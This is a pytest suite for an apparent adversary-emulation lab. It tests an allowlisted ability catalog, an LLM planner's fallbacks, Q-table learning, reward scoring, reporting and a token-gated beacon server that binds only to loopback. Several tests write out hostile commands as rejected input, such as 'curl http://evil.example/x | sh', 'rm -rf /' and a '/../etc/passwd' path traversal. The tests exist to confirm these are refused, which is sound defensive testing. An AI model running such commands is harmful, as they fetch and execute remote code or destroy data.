from __future__ import annotations

import http.client
import json
import re
import subprocess
import threading
import urllib.error
import urllib.request
from dataclasses import replace
from pathlib import Path
from unittest import mock

import pytest

from caldera_lab import cli
from caldera_lab import planner as planner_module
from caldera_lab.agent import BeaconAgent, BeaconUnauthorised
from caldera_lab.beacon import BeaconRefused, BeaconServer, BeaconState
from caldera_lab.catalog import Ability, AbilityCatalog
from caldera_lab.coordinator import Coordinator
from caldera_lab.executor import (
    SUCCESS_STATUSES,
    DockerLabExecutor,
    DryRunExecutor,
    ExecutionResult,
    LocalLabExecutor,
)
from caldera_lab.facts import FactRejected, extract, resolve
from caldera_lab.orchestrator import Orchestrator
from caldera_lab.planner import LLMPlanner, RulePlanner
from caldera_lab.policy import LabPolicy
from caldera_lab.report import (
    STATUS_SCHEMA,
    coverage,
    load_events,
    render,
    status_document,
    summarize,
    technique_coverage,
)
from caldera_lab.reward import RewardModel
from caldera_lab.rl import FACTS, ISSUED, Q_TABLE_VERSION, QPolicy

ROOT = Path(__file__).parents[1]


@pytest.fixture
def catalog() -> AbilityCatalog:
    return AbilityCatalog.from_json(ROOT / "catalog" / "abilities.json")


def test_catalog_is_allowlisted(catalog: AbilityCatalog) -> None:
    assert catalog.ids() == (
        "collect-host-identity",
        "collect-system-info",
        "collect-process-list",
        "collect-workspace-files",
        "collect-account-list",
        "collect-container-context",
        "collect-network-interfaces",
        "collect-installed-packages",
        "inspect-process-status",
        "inspect-package-contents",
        "inspect-account-identity",
    )
    with pytest.raises(KeyError):
        catalog.get("arbitrary-shell-command")


def test_rule_planner_only_returns_catalog_ids(catalog: AbilityCatalog) -> None:
    plan = RulePlanner(catalog).plan((), 3)
    assert len(plan.ability_ids) == 3
    assert set(plan.ability_ids) <= set(catalog.ids())


def test_orchestrator_dry_run_writes_auditable_events(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    log = tmp_path / "events.jsonl"
    events = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules").run(3, log)
    assert [event.event for event in events].count("ability.approved") == 3
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    assert records[0]["event"] == "plan.created"
    completed = [record for record in records if record["event"] == "ability.completed"]
    assert len(completed) == 3
    assert all(record["details"]["isolation"] == "dry-run" for record in completed)


def test_local_executor_runs_without_a_shell(catalog: AbilityCatalog, tmp_path: Path) -> None:
    result = LocalLabExecutor(tmp_path).execute(catalog.get("collect-host-identity"), LabPolicy())
    assert result.status == "succeeded"
    assert "uid=" in result.stdout


def test_local_executor_cannot_be_selected_without_explicit_flag() -> None:
    with pytest.raises(SystemExit) as exc:
        cli.main(["run", "--executor", "local", "--steps", "1"])
    assert exc.value.code != 0


def test_local_executor_is_selectable_with_the_explicit_flag(tmp_path: Path) -> None:
    cli.main(
        [
            "run",
            "--executor",
            "local",
            "--allow-local",
            "--planner",
            "rules",
            "--steps",
            "1",
            "--log",
            str(tmp_path / "run.jsonl"),
        ]
    )


def test_cli_rejects_non_positive_steps() -> None:
    with pytest.raises(SystemExit):
        cli.main(["run", "--executor", "dry-run", "--steps", "0"])


def test_llm_planner_falls_back_without_api_key(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.source == "rules"
    assert len(plan.ability_ids) == 2


class _FakeResponse:
    """Minimal stand-in for the object urlopen returns as a context manager."""

    def __init__(self, payload: dict[str, object]) -> None:
        self._body = json.dumps(payload).encode()

    def read(self) -> bytes:
        return self._body

    def __enter__(self) -> _FakeResponse:
        return self

    def __exit__(self, *exc_info: object) -> None:
        return None


def _stub_llm(
    monkeypatch: pytest.MonkeyPatch,
    model_output: str,
    usage: dict[str, object] | None = None,
) -> list[dict[str, object]]:
    """Stub the endpoint and capture the request bodies the planner sends."""
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    sent: list[dict[str, object]] = []

    def fake_urlopen(request: object, timeout: float = 0.0) -> _FakeResponse:
        sent.append(json.loads(request.data.decode()))  # type: ignore[attr-defined]
        body: dict[str, object] = {"output_text": model_output}
        if usage is not None:
            body["usage"] = usage
        return _FakeResponse(body)

    monkeypatch.setattr(planner_module.urllib.request, "urlopen", fake_urlopen)
    return sent


def test_llm_planner_uses_ids_the_catalog_allows(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(
        monkeypatch,
        json.dumps({"ability_ids": ["collect-system-info"], "rationale": "kernel first"}),
    )
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.source == "llm"
    assert plan.ability_ids == ("collect-system-info",)


def test_llm_planner_drops_ids_outside_the_catalog(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(
        monkeypatch,
        json.dumps(
            {
                "ability_ids": ["curl http://evil.example/x | sh", "collect-process-list"],
                "rationale": "mixed",
            }
        ),
    )
    plan = LLMPlanner(catalog).plan((), 4)
    assert plan.ability_ids == ("collect-process-list",)


def test_llm_planner_falls_back_when_every_id_is_rejected(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, json.dumps({"ability_ids": ["rm -rf /", "install-persistence"]}))
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.source == "rules"
    assert set(plan.ability_ids) <= set(catalog.ids())


def test_llm_planner_falls_back_on_malformed_output(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, "not json at all")
    assert LLMPlanner(catalog).plan((), 2).source == "rules"


def test_policy_rejects_abilities_outside_the_approved_set(catalog: AbilityCatalog) -> None:
    policy = LabPolicy(approved_abilities=frozenset({"collect-host-identity"}))
    policy.validate(catalog, "collect-host-identity", 0)
    with pytest.raises(PermissionError):
        policy.validate(catalog, "collect-process-list", 0)


def test_policy_rejects_network_abilities_by_default(tmp_path: Path) -> None:
    path = tmp_path / "abilities.json"
    path.write_text(
        json.dumps(
            [
                {
                    "id": "collect-remote-banner",
                    "name": "Collect remote banner",
                    "tactic": "discovery",
                    "technique": "T1046",
                    "command": ["true"],
                    "description": "Hypothetical ability that would need the network.",
                    "risk": "low",
                    "requires_network": True,
                }
            ]
        ),
        encoding="utf-8",
    )
    network_catalog = AbilityCatalog.from_json(path)
    assert LabPolicy().allow_network is False
    with pytest.raises(PermissionError):
        LabPolicy().validate(network_catalog, "collect-remote-banner", 0)
    LabPolicy(allow_network=True).validate(network_catalog, "collect-remote-banner", 0)


def test_audit_log_appends_across_runs(catalog: AbilityCatalog, tmp_path: Path) -> None:
    log = tmp_path / "events.jsonl"
    first = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules").run(2, log)
    second = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules").run(2, log)
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    assert len(records) == len(first) + len(second)
    run_ids = {record["run_id"] for record in records}
    assert len(run_ids) == 2


def test_state_is_bounded_and_revisited(catalog: AbilityCatalog) -> None:
    policy = QPolicy(catalog, state_mode=ISSUED)
    # Order of arrival must not matter: the same completed set is the same state.
    forward = policy.state(("collect-host-identity:succeeded:0", "collect-system-info:succeeded:0"))
    reverse = policy.state(("collect-system-info:succeeded:0", "collect-host-identity:succeeded:0"))
    assert forward == reverse
    assert forward == "11" + "0" * (len(catalog.ids()) - 2) + "|clean"
    # A failure is a different state than a success over the same set.
    assert policy.state(("collect-host-identity:failed:1",)) != policy.state(
        ("collect-host-identity:succeeded:0",)
    )
    assert policy.state(()) == "0" * len(catalog.ids()) + "|clean"


def test_the_default_state_records_what_is_known_not_what_was_run(
    catalog: AbilityCatalog,
) -> None:
    """Two surface reads are interchangeable for the next decision. Recording
    which one happened splits one decision across 2^len(catalog) states that
    each have to be learned on their own."""
    policy = QPolicy(catalog)
    assert policy.state_mode == FACTS
    one = policy.state(("collect-host-identity:succeeded:0",))
    other = policy.state(("collect-system-info:succeeded:0",))
    assert one == other == "000|1|clean"
    # A discovery is not interchangeable: it changes what can be run next.
    assert policy.state(("collect-process-list:succeeded:0",)) != one
    assert policy.state(()) == "000|0|clean"
    # Budget spent is part of the state, because the horizon changes the choice.
    assert policy.state(
        ("collect-host-identity:succeeded:0", "collect-system-info:succeeded:0")
    ) != policy.state(("collect-host-identity:succeeded:0",))


def test_the_state_layout_is_part_of_what_a_saved_table_applies_to(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    path = tmp_path / "q.json"
    QPolicy(catalog, state_mode=ISSUED).save(path)
    assert QPolicy(catalog, state_mode=FACTS).load(path) is False
    assert QPolicy(catalog, state_mode=ISSUED).load(path) is True


def test_learning_reaches_entries_it_has_already_written(catalog: AbilityCatalog) -> None:
    policy = QPolicy(catalog)
    state = policy.state(("collect-host-identity:succeeded:0",))
    policy.update(state, "collect-system-info", 1.0, policy.state(()))
    learned = policy.q[(state, "collect-system-info")]
    assert learned > 0.0
    # The same observation history must land on the same key, not a fresh one.
    again = policy.state(("collect-host-identity:succeeded:0",))
    assert policy.q.get((again, "collect-system-info")) == learned


def test_q_table_round_trips(catalog: AbilityCatalog, tmp_path: Path) -> None:
    path = tmp_path / "q.json"
    trained = QPolicy(catalog)
    trained.update(trained.state(()), "collect-system-info", 1.0, trained.state(()))
    trained.save(path)
    restored = QPolicy(catalog)
    assert restored.load(path) is True
    assert restored.q == trained.q


def test_q_table_is_rejected_when_the_catalog_changed(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    path = tmp_path / "q.json"
    QPolicy(catalog).save(path)
    payload = json.loads(path.read_text(encoding="utf-8"))
    payload["catalog"] = "some-other-catalog"
    path.write_text(json.dumps(payload), encoding="utf-8")
    fresh = QPolicy(catalog)
    assert fresh.load(path) is False
    assert fresh.q == {}


def test_q_table_is_rejected_when_corrupt(catalog: AbilityCatalog, tmp_path: Path) -> None:
    path = tmp_path / "q.json"
    path.write_text("{ not json", encoding="utf-8")
    assert QPolicy(catalog).load(path) is False
    path.write_text(
        json.dumps({"version": Q_TABLE_VERSION, "catalog": "x", "entries": "nope"}),
        encoding="utf-8",
    )
    assert QPolicy(catalog).load(path) is False


def test_q_table_rejects_actions_outside_the_catalog(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    path = tmp_path / "q.json"
    policy = QPolicy(catalog)
    path.write_text(
        json.dumps(
            {
                "version": Q_TABLE_VERSION,
                "catalog": policy.fingerprint(),
                "entries": [{"state": "0" * 8 + "|clean", "action": "rm -rf /", "value": 9.0}],
            }
        ),
        encoding="utf-8",
    )
    assert policy.load(path) is False
    assert policy.q == {}


def test_orchestrator_persists_learning_across_runs(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    table = tmp_path / "q.json"
    first = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules", q_table_path=table)
    first.run(3)
    assert first.q_table_loaded is False
    assert table.exists()

    second = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules", q_table_path=table)
    assert second.q_table_loaded is True
    assert second.rl.q == first.rl.q
    events = second.run(3)
    loaded = next(event for event in events if event.event == "rl.loaded")
    assert loaded.details["restored"] is True


def test_runs_are_reproducible_for_a_seed(catalog: AbilityCatalog) -> None:
    def choices() -> list[str]:
        events = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules", seed=11).run(4)
        return [
            str(event.details["ability_id"])
            for event in events
            if event.event == "ability.approved"
        ]

    assert choices() == choices()


def _result(stdout: str, status: str = "succeeded", duration: float = 0.0) -> ExecutionResult:
    return ExecutionResult("collect-host-identity", status, stdout, "", 0, "dry-run", duration)


def test_reward_pays_for_new_facts_and_not_for_repeats() -> None:
    model = RewardModel()
    policy = LabPolicy()
    first = model.score(_result("uid=0\ngid=0\n"), policy)
    assert first.novel_facts == 2 and first.known_facts == 0
    assert first.information_gain == 1.0

    repeat = model.score(_result("uid=0\ngid=0\n"), policy)
    assert repeat.novel_facts == 0 and repeat.known_facts == 2
    assert repeat.information_gain == 0.0
    assert repeat.total < first.total


def test_reward_is_partial_when_output_is_partly_new() -> None:
    model = RewardModel()
    model.score(_result("alpha\n"), LabPolicy())
    mixed = model.score(_result("alpha\nbeta\n"), LabPolicy())
    assert (mixed.novel_facts, mixed.known_facts) == (1, 1)
    assert mixed.information_gain == 0.5


def test_reward_ignores_whitespace_differences() -> None:
    model = RewardModel()
    model.score(_result("uid=0   gid=0\n"), LabPolicy())
    assert model.score(_result("  uid=0 gid=0  \n"), LabPolicy()).novel_facts == 0


def test_reward_penalises_failure_and_grants_no_information() -> None:
    breakdown = RewardModel().score(_result("anything\n", status="failed"), LabPolicy())
    assert breakdown.outcome == -1.0
    assert breakdown.information_gain == 0.0
    assert breakdown.total < 0


def test_reward_charges_for_time_against_the_policy_budget() -> None:
    policy = LabPolicy(timeout_seconds=10)
    cheap = RewardModel().score(_result("x\n", duration=0.0), policy)
    slow = RewardModel().score(_result("x\n", duration=10.0), policy)
    assert cheap.cost == 0.0
    assert slow.cost == 0.25
    assert slow.total < cheap.total
    # Cost is capped, so an overrun cannot dominate the signal.
    assert RewardModel().score(_result("x\n", duration=999.0), policy).cost == 0.25


def test_reward_novelty_is_per_episode(catalog: AbilityCatalog) -> None:
    model = RewardModel()
    model.score(_result("uid=0\n"), LabPolicy())
    model.reset()
    assert model.score(_result("uid=0\n"), LabPolicy()).novel_facts == 1


def test_orchestrator_resets_novelty_between_runs(catalog: AbilityCatalog) -> None:
    orchestrator = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules")

    def gains() -> list[float]:
        return [
            float(event.details["information_gain"])
            for event in orchestrator.run(4)
            if event.event == "reward.scored"
        ]

    assert gains() == gains()


def test_reward_ignores_output_an_ability_declares_volatile(catalog: AbilityCatalog) -> None:
    """The hostname in `uname -a` changes every run without being a discovery."""
    ability = catalog.get("collect-system-info")
    assert ability.volatile_patterns
    model = RewardModel()
    policy = LabPolicy()
    model.score(_result("Linux 1e79fc82fa62 6.18.33.2 x86_64\n"), policy, ability)
    repeat = model.score(_result("Linux f89550a4fead 6.18.33.2 x86_64\n"), policy, ability)
    assert repeat.information_gain == 0.0
    assert repeat.normalized is True


def test_reward_still_sees_real_change_in_a_normalised_ability(catalog: AbilityCatalog) -> None:
    # Masking must not blind the model to the parts that actually differ.
    ability = catalog.get("collect-system-info")
    model = RewardModel()
    model.score(_result("Linux 1e79fc82fa62 6.18.33.2 x86_64\n"), LabPolicy(), ability)
    changed = model.score(_result("Linux f89550a4fead 7.0.0 aarch64\n"), LabPolicy(), ability)
    assert changed.information_gain == 1.0


def test_process_list_patterns_mask_cpu_and_times(catalog: AbilityCatalog) -> None:
    patterns = catalog.get("collect-process-list").volatile_patterns
    first = RewardModel.facts("nobody 1 0 38 03:45 ?        00:00:00 ps -ef\n", patterns)
    second = RewardModel.facts("nobody 1 0 40 03:52 ?        00:00:01 ps -ef\n", patterns)
    assert first == second
    # The uid and pid are still there: only the volatile columns were masked.
    assert first == ["nobody 1 0 <volatile> <volatile> ? <volatile> ps -ef"]


def test_abilities_without_patterns_keep_exact_matching(catalog: AbilityCatalog) -> None:
    ability = catalog.get("collect-host-identity")
    assert ability.volatile_patterns == ()
    model = RewardModel()
    model.score(_result("uid=65534(nobody)\n"), LabPolicy(), ability)
    # A different uid is a real finding and must not be masked away.
    changed = model.score(_result("uid=0(root)\n"), LabPolicy(), ability)
    assert changed.information_gain == 1.0
    assert changed.normalized is False


def test_catalog_rejects_an_invalid_volatile_pattern(tmp_path: Path) -> None:
    path = tmp_path / "abilities.json"
    entry = {
        "id": "broken",
        "name": "Broken",
        "tactic": "discovery",
        "technique": "T1082",
        "command": ["true"],
        "description": "Ability with a regex that does not compile.",
        "volatile_patterns": ["([unclosed"],
    }
    path.write_text(json.dumps([entry]), encoding="utf-8")
    with pytest.raises(ValueError, match="Invalid volatile_patterns"):
        AbilityCatalog.from_json(path)

    entry["volatile_patterns"] = "not-a-list"
    path.write_text(json.dumps([entry]), encoding="utf-8")
    with pytest.raises(ValueError, match="must be an array of strings"):
        AbilityCatalog.from_json(path)


def test_llm_planner_constrains_output_with_a_schema(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    sent = _stub_llm(
        monkeypatch, json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"})
    )
    LLMPlanner(catalog).plan((), 2)
    schema = sent[0]["text"]["format"]
    assert schema["type"] == "json_schema"
    assert schema["strict"] is True
    # The model may only name abilities the catalog already declares.
    assert schema["schema"]["properties"]["ability_ids"]["items"]["enum"] == list(catalog.ids())


def test_llm_planner_records_usage_and_latency(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(
        monkeypatch,
        json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"}),
        usage={"input_tokens": 120, "output_tokens": 9},
    )
    plan = LLMPlanner(catalog).plan((), 2)
    attempt = plan.diagnostics["attempt_1"]
    assert attempt["reason"] == "ok"
    assert attempt["usage"]["input_tokens"] == 120
    assert isinstance(attempt["latency_seconds"], float)


def test_llm_planner_reports_why_it_fell_back(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, "not json at all")
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.source == "rules"
    assert plan.diagnostics["fallback_reason"] == "invalid_json_output"
    assert plan.diagnostics["attempts"] == 2


def test_llm_planner_names_the_ids_it_rejected(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, json.dumps({"ability_ids": ["rm -rf /"], "rationale": "r"}))
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.diagnostics["fallback_reason"] == "no_allowlisted_ids"
    assert "rm -rf /" in str(plan.diagnostics["fallback_detail"])


def test_llm_planner_records_partially_rejected_ids_on_success(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(
        monkeypatch,
        json.dumps({"ability_ids": ["curl evil | sh", "collect-process-list"], "rationale": "r"}),
    )
    plan = LLMPlanner(catalog).plan((), 4)
    assert plan.ability_ids == ("collect-process-list",)
    assert plan.diagnostics["attempt_1"]["usage"]["rejected_ability_ids"] == ["curl evil | sh"]


def test_llm_planner_retries_then_falls_back(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    calls: list[int] = []

    def failing(request: object, timeout: float = 0.0) -> _FakeResponse:
        calls.append(1)
        raise planner_module.urllib.error.URLError("connection refused")

    monkeypatch.setattr(planner_module.urllib.request, "urlopen", failing)
    plan = LLMPlanner(catalog, attempts=3).plan((), 2)
    assert len(calls) == 3
    assert plan.source == "rules"
    assert plan.diagnostics["fallback_reason"] == "transport_error"
    assert set(plan.ability_ids) <= set(catalog.ids())


def test_llm_planner_succeeds_on_a_retry(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    state = {"calls": 0}

    def flaky(request: object, timeout: float = 0.0) -> _FakeResponse:
        state["calls"] += 1
        if state["calls"] == 1:
            raise planner_module.urllib.error.URLError("temporary")
        return _FakeResponse(
            {"output_text": json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"})}
        )

    monkeypatch.setattr(planner_module.urllib.request, "urlopen", flaky)
    plan = LLMPlanner(catalog, attempts=2).plan((), 2)
    assert plan.source == "llm"
    assert plan.diagnostics["attempt_1"]["reason"] == "transport_error"
    assert plan.diagnostics["attempt_2"]["reason"] == "ok"


def test_missing_api_key_is_recorded_without_burning_attempts(
    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    plan = LLMPlanner(catalog).plan((), 2)
    assert plan.diagnostics["fallback_reason"] == "no_api_key"
    assert plan.diagnostics["attempts"] == 0


def test_planner_fallback_reaches_the_audit_log(
    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, "not json at all")
    log = tmp_path / "events.jsonl"
    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    created = next(record for record in records if record["event"] == "plan.created")
    assert created["details"]["diagnostics"]["fallback_reason"] == "invalid_json_output"


def _run_log(catalog: AbilityCatalog, tmp_path: Path, runs: int = 1) -> Path:
    log = tmp_path / "events.jsonl"
    for _ in range(runs):
        Orchestrator(catalog, DryRunExecutor(), planner_mode="rules").run(4, log)
    return log


def test_report_counts_dry_run_executions_as_successful(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    # "planned" is the dry-run success status; counting it as a failure once
    # made a clean run look entirely broken.
    summaries = summarize(load_events(_run_log(catalog, tmp_path)))
    summary = next(iter(summaries.values()))
    assert sum(summary.failed.values()) == 0
    assert summary.executions == 4


def test_report_separates_runs_in_an_appended_log(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    summaries = summarize(load_events(_run_log(catalog, tmp_path, runs=3)))
    assert len(summaries) == 3
    assert all(summary.executions == 4 for summary in summaries.values())


def test_report_maps_executions_onto_attack_techniques(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    rows = coverage(catalog, summarize(load_events(_run_log(catalog, tmp_path))))
    assert {row["technique"] for row in rows} == {
        "T1033", "T1082", "T1057", "T1083", "T1087.001", "T1613", "T1016", "T1518"
    }
    executed = [row for row in rows if row["successes"]]
    assert len(executed) == 4


def test_report_flags_techniques_that_never_ran(catalog: AbilityCatalog, tmp_path: Path) -> None:
    log = _run_log(catalog, tmp_path)
    kept = [
        line
        for line in log.read_text(encoding="utf-8").splitlines()
        if "collect-process-list" not in line
    ]
    log.write_text("\n".join(kept) + "\n", encoding="utf-8")
    rows = coverage(catalog, summarize(load_events(log)))
    uncovered = {row["technique"] for row in rows if row["successes"] == 0}
    assert "T1057" in uncovered
    assert "!" in render(catalog, summarize(load_events(log)))


def test_report_surfaces_planner_fallbacks_and_rejected_ids(
    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(monkeypatch, json.dumps({"ability_ids": ["rm -rf /"], "rationale": "r"}))
    log = tmp_path / "events.jsonl"
    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
    summary = next(iter(summarize(load_events(log)).values()))
    assert summary.fallback_reasons["no_allowlisted_ids"] >= 1
    assert "planner fallbacks" in render(catalog, summarize(load_events(log)))


def test_report_records_ids_the_allowlist_refused(
    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_llm(
        monkeypatch,
        json.dumps({"ability_ids": ["curl evil | sh", "collect-process-list"], "rationale": "r"}),
    )
    log = tmp_path / "events.jsonl"
    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
    summary = next(iter(summarize(load_events(log)).values()))
    assert summary.rejected_ability_ids["curl evil | sh"] >= 1
    assert "rejected ability ids" in render(catalog, summarize(load_events(log)))


def test_report_skips_unusable_lines(catalog: AbilityCatalog, tmp_path: Path) -> None:
    log = _run_log(catalog, tmp_path)
    with log.open("a", encoding="utf-8") as handle:
        handle.write("not json\n\n")
        handle.write(json.dumps(["not", "an", "object"]) + "\n")
    assert len(summarize(load_events(log))) == 1


def test_report_cli_errors_on_a_missing_log(tmp_path: Path) -> None:
    with pytest.raises(SystemExit):
        cli.main(["report", "--log", str(tmp_path / "absent.jsonl")])


def test_report_cli_emits_json(catalog: AbilityCatalog, tmp_path: Path, capsys) -> None:
    log = _run_log(catalog, tmp_path)
    cli.main(["report", "--log", str(log), "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert len(payload["runs"]) == 1
    assert len(payload["coverage"]) == len(catalog.ids())


def test_report_json_keeps_counter_keys_intact(catalog: AbilityCatalog, tmp_path: Path) -> None:
    # dataclasses.asdict rebuilds Counters from their items, which turns
    # {"collect-host-identity": 1} into {("collect-host-identity", 1): 1}.
    summary = next(iter(summarize(load_events(_run_log(catalog, tmp_path))).values()))
    payload = summary.as_dict()
    assert set(payload["succeeded"]) <= set(catalog.ids())
    assert all(isinstance(key, str) for key in payload["succeeded"])
    json.dumps(payload)


@pytest.fixture
def beacon(catalog: AbilityCatalog):
    state = BeaconState(catalog, queue=_ungated(catalog))
    server = BeaconServer(state).start()
    try:
        yield server, state
    finally:
        server.stop()


def _ungated(catalog: AbilityCatalog) -> tuple[str, ...]:
    """Abilities a fixed queue can serve: the ones needing no discovered facts."""
    return tuple(a.id for a in catalog.all() if not a.requires)


def _raw_post(
    url: str, path: str, payload: dict[str, object], token: str | None
) -> tuple[int, dict[str, object]]:
    headers = {"Content-Type": "application/json"}
    if token is not None:
        headers["X-Caldera-Token"] = token
    request = urllib.request.Request(
        f"{url}{path}", data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, json.loads(response.read().decode())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read().decode())


def test_beacon_server_refuses_to_bind_anything_but_loopback(catalog: AbilityCatalog) -> None:
    for host in ("0.0.0.0", "::", "192.168.1.10", ""):
        with pytest.raises(BeaconRefused, match="binds 127.0.0.1 only"):
            BeaconServer(BeaconState(catalog), host=host)


def test_beacon_server_binds_loopback(beacon) -> None:
    server, _ = beacon
    assert server.url.startswith("http://127.0.0.1:")


def test_beacon_requires_the_run_token(beacon) -> None:
    server, _ = beacon
    # Reaching loopback is not authorisation; any local process could otherwise
    # drive the lab.
    assert _raw_post(server.url, "/register", {"agent_id": "a"}, None)[0] == 401
    assert _raw_post(server.url, "/register", {"agent_id": "a"}, "wrong")[0] == 401
    assert _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)[0] == 200


def test_beacon_never_sends_a_command(beacon) -> None:
    server, _ = beacon
    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
    status, body = _raw_post(server.url, "/beacon", {"agent_id": "a"}, server.token)
    assert status == 200
    # The wire carries an ability ID and discovered values, never a command.
    assert set(body) == {"ability_id", "bindings"}
    assert body["ability_id"] in set(server.state.catalog.ids())
    catalog = server.state.catalog
    for trait, value in body["bindings"].items():
        # Every value has to fit the shape its trait declares, so a binding
        # cannot smuggle in an argument the catalog would not allow.
        assert re.fullmatch(catalog.trait_pattern(trait), value)


def test_beacon_queue_rejects_an_ability_outside_the_catalog(catalog: AbilityCatalog) -> None:
    with pytest.raises(KeyError):
        BeaconState(catalog, queue=("rm -rf /",))


def test_beacon_rejects_a_result_for_an_unknown_ability(beacon) -> None:
    server, _ = beacon
    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
    status, _ = _raw_post(
        server.url,
        "/result",
        {"agent_id": "a", "ability_id": "curl evil | sh", "status": "succeeded"},
        server.token,
    )
    assert status == 400


def test_beacon_rejects_an_unregistered_agent(beacon) -> None:
    server, _ = beacon
    assert _raw_post(server.url, "/beacon", {"agent_id": "ghost"}, server.token)[0] == 403


def test_beacon_rejects_unknown_endpoints_and_methods(beacon) -> None:
    server, _ = beacon
    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
    assert _raw_post(server.url, "/../etc/passwd", {"agent_id": "a"}, server.token)[0] == 404
    assert _raw_post(server.url, "/shell", {"agent_id": "a"}, server.token)[0] == 404
    request = urllib.request.Request(server.url + "/beacon", method="GET")
    with pytest.raises(urllib.error.HTTPError) as exc:
        urllib.request.urlopen(request, timeout=5)
    assert exc.value.code in {401, 405}


def test_beacon_rejects_an_oversized_body(beacon) -> None:
    server, _ = beacon
    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
    payload = {"agent_id": "a", "ability_id": "collect-host-identity", "stdout": "x" * 300_000}
    assert _raw_post(server.url, "/result", payload, server.token)[0] == 400


def test_beacon_rejects_a_malformed_agent_id(beacon) -> None:
    server, _ = beacon
    assert _raw_post(server.url, "/register", {"agent_id": ""}, server.token)[0] == 400
    assert _raw_post(server.url, "/register", {"agent_id": 7}, server.token)[0] == 400


def test_agent_completes_the_beacon_cycle(beacon, catalog: AbilityCatalog) -> None:
    server, state = beacon
    agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
    executed = agent.run()
    assert executed == list(_ungated(catalog))
    record = state.agents[agent.agent_id]
    assert len(record.results) == len(_ungated(catalog))
    assert {result["ability_id"] for result in record.results} == set(_ungated(catalog))


def test_agent_stops_when_the_queue_is_empty(beacon, catalog: AbilityCatalog) -> None:
    server, _ = beacon
    agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
    assert len(agent.run(max_beacons=64)) == len(_ungated(catalog))


def test_agent_still_applies_the_local_policy(catalog: AbilityCatalog) -> None:
    state = BeaconState(catalog, queue=("collect-process-list",))
    server = BeaconServer(state).start()
    try:
        # The server asked for an ability this lab has not approved.
        policy = LabPolicy(approved_abilities=frozenset({"collect-host-identity"}))
        agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, policy)
        with pytest.raises(PermissionError):
            agent.run()
    finally:
        server.stop()


def test_serve_cli_runs_a_full_cycle(tmp_path: Path, capsys) -> None:
    # An explicit --log keeps the test off the repository's real runtime log.
    cli.main(
        ["serve", "--executor", "dry-run", "--steps", "3", "--log", str(tmp_path / "run.jsonl")]
    )
    out = capsys.readouterr().out
    assert "http://127.0.0.1:" in out
    assert "ran 3 abilities" in out


def test_serve_cli_honours_the_local_executor_gate() -> None:
    with pytest.raises(SystemExit):
        cli.main(["serve", "--executor", "local", "--steps", "1"])


